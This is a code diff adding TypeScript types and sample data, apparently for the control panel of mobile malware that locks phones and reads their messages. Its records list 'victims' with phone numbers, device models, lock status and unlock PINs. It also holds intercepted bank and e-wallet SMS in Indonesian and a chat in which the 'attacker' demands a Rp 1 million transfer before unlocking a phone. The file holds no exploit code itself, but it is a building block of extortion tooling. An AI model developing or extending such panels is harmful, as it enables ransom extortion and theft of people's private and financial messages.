@@ -1,0 +1,44 @@
+export interface Victim {
+  id: string;
+  phone: string;
+  model: string;
+  lastSeen: string;
+  locked: boolean;
+  pin?: string;
+}
+
+export const dummyVictims: Victim[] = [
+  { id: "1", phone: "+62812345678", model: "Samsung Galaxy S23", lastSeen: "2026-07-08 10:30", locked: false },
+  { id: "2", phone: "+62898765432", model: "Xiaomi 13T", lastSeen: "2026-07-08 09:15", locked: true, pin: "1337" },
+  { id: "3", phone: "+62811122233", model: "iPhone 15 Pro", lastSeen: "2026-07-07 22:05", locked: false },
+];
+
+export interface SMS {
+  address: string;
+  body: string;
+  date: string;
+}
+
+export const dummySMS: Record<string, SMS[]> = {
+  "1": [
+    { address: "Bank Mandiri", body: "Saldo Anda: Rp 50.000", date: "2026-07-08 10:01" },
+    { address: "Ibu", body: "Nak, pulang jam berapa?", date: "2026-07-08 09:50" },
+  ],
+  "2": [
+    { address: "GoPay", body: "Top up berhasil Rp 100.000", date: "2026-07-08 09:10" },
+  ],
+  "3": [],
+};
+
+export interface ChatMessage {
+  sender: "attacker" | "victim";
+  text: string;
+  timestamp: number;
+}
+
+export const dummyChats: Record<string, ChatMessage[]> = {
+  "2": [
+    { sender: "victim", text: "Tolong buka HP saya", timestamp: Date.now() - 60000 },
+    { sender: "attacker", text: "Transfer dulu Rp 1jt baru gw buka", timestamp: Date.now() - 30000 },
+  ],
+};
